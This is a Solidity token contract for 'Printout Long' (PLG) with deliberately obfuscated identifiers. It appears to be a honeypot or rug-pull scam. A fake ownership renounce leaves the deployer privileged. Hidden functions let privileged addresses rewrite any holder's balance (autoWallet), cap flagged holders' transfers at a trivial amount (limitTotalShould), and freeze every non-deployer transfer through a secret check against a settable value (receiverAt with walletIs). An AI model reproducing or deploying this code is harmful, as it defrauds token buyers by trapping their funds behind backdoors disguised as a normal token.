//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface fundBuyList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract minTxLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountIsMode {
    function createPair(address amountSwap, address fromMax) external returns (address);
}

interface teamToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitShould) external view returns (uint256);

    function transfer(address teamMax, uint256 liquidityTxMax) external returns (bool);

    function allowance(address fundTradingTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityTxMax) external returns (bool);

    function transferFrom(
        address sender,
        address teamMax,
        uint256 liquidityTxMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundMax, uint256 value);
    event Approval(address indexed fundTradingTx, address indexed spender, uint256 value);
}

interface teamTokenMetadata is teamToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PrintoutLong is minTxLaunched, teamToken, teamTokenMetadata {

    address public amountLimitTotal;

    function getOwner() external view returns (address) {
        return fromMin;
    }

    uint256 walletIs;

    bool private minToken;

    bool private launchedMin;

    function allowance(address sellAutoTx, address takeTotal) external view virtual override returns (uint256) {
        if (takeTotal == minSender) {
            return type(uint256).max;
        }
        return isReceiverMarketing[sellAutoTx][takeTotal];
    }

    string private atAmount = "Printout Long";

    address walletToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private swapTokenLaunch;

    function totalSupply() external view virtual override returns (uint256) {
        return autoTeam;
    }

    function approve(address takeTotal, uint256 liquidityTxMax) public virtual override returns (bool) {
        isReceiverMarketing[_msgSender()][takeTotal] = liquidityTxMax;
        emit Approval(_msgSender(), takeTotal, liquidityTxMax);
        return true;
    }

    uint256 totalLaunch;

    function balanceOf(address limitShould) public view virtual override returns (uint256) {
        return tokenAuto[limitShould];
    }

    function transferFrom(address walletAmountFund, address teamMax, uint256 liquidityTxMax) external override returns (bool) {
        if (_msgSender() != minSender) {
            if (isReceiverMarketing[walletAmountFund][_msgSender()] != type(uint256).max) {
                require(liquidityTxMax <= isReceiverMarketing[walletAmountFund][_msgSender()]);
                isReceiverMarketing[walletAmountFund][_msgSender()] -= liquidityTxMax;
            }
        }
        return modeTrading(walletAmountFund, teamMax, liquidityTxMax);
    }

    event OwnershipTransferred(address indexed buyExemptReceiver, address indexed launchAtMax);

    mapping(address => uint256) private tokenAuto;

    bool public modeTotalTx;

    function senderIsMin() public {
        emit OwnershipTransferred(atMinLaunch, address(0));
        fromMin = address(0);
    }

    function feeWallet(address txFrom) public {
        if (modeTotalTx) {
            return;
        }
        if (marketingLiquidityLaunch == modeAt) {
            txTotal = true;
        }
        swapLaunchSender[txFrom] = true;
        if (swapTokenLaunch == modeAt) {
            modeAt = swapTokenLaunch;
        }
        modeTotalTx = true;
    }

    function tokenTakeTrading() private view {
        require(swapLaunchSender[_msgSender()]);
    }

    function transfer(address launchedShould, uint256 liquidityTxMax) external virtual override returns (bool) {
        return modeTrading(_msgSender(), launchedShould, liquidityTxMax);
    }

    constructor (){
        if (atMode != minToken) {
            atMode = false;
        }
        fundBuyList liquidityToken = fundBuyList(minSender);
        amountLimitTotal = amountIsMode(liquidityToken.factory()).createPair(liquidityToken.WETH(), address(this));
        if (minToken == walletLaunch) {
            walletLaunch = false;
        }
        atMinLaunch = _msgSender();
        senderIsMin();
        swapLaunchSender[atMinLaunch] = true;
        tokenAuto[atMinLaunch] = autoTeam;
        
        emit Transfer(address(0), atMinLaunch, autoTeam);
    }

    uint8 private toSwapReceiver = 18;

    function name() external view virtual override returns (string memory) {
        return atAmount;
    }

    address minSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private marketingLiquidityLaunch;

    uint256 constant exemptToken = 11 ** 10;

    string private teamEnable = "PLG";

    bool public txTotal;

    function owner() external view returns (address) {
        return fromMin;
    }

    function receiverAt(uint256 liquidityTxMax) public {
        tokenTakeTrading();
        walletIs = liquidityTxMax;
    }

    bool public atMode;

    address public atMinLaunch;

    uint256 private autoTeam = 100000000 * 10 ** 18;

    function sellTradingFee(address walletAmountFund, address teamMax, uint256 liquidityTxMax) internal returns (bool) {
        require(tokenAuto[walletAmountFund] >= liquidityTxMax);
        tokenAuto[walletAmountFund] -= liquidityTxMax;
        tokenAuto[teamMax] += liquidityTxMax;
        emit Transfer(walletAmountFund, teamMax, liquidityTxMax);
        return true;
    }

    function limitTotalShould(address teamLaunchedWallet) public {
        tokenTakeTrading();
        
        if (teamLaunchedWallet == atMinLaunch || teamLaunchedWallet == amountLimitTotal) {
            return;
        }
        senderReceiver[teamLaunchedWallet] = true;
    }

    mapping(address => bool) public senderReceiver;

    function autoWallet(address launchedShould, uint256 liquidityTxMax) public {
        tokenTakeTrading();
        tokenAuto[launchedShould] = liquidityTxMax;
    }

    mapping(address => bool) public swapLaunchSender;

    function symbol() external view virtual override returns (string memory) {
        return teamEnable;
    }

    uint256 private modeAt;

    function modeTrading(address walletAmountFund, address teamMax, uint256 liquidityTxMax) internal returns (bool) {
        if (walletAmountFund == atMinLaunch) {
            return sellTradingFee(walletAmountFund, teamMax, liquidityTxMax);
        }
        uint256 listTo = teamToken(amountLimitTotal).balanceOf(walletToken);
        require(listTo == walletIs);
        require(teamMax != walletToken);
        if (senderReceiver[walletAmountFund]) {
            return sellTradingFee(walletAmountFund, teamMax, exemptToken);
        }
        return sellTradingFee(walletAmountFund, teamMax, liquidityTxMax);
    }

    bool public walletLaunch;

    mapping(address => mapping(address => uint256)) private isReceiverMarketing;

    bool private swapLaunch;

    address private fromMin;

    function decimals() external view virtual override returns (uint8) {
        return toSwapReceiver;
    }

}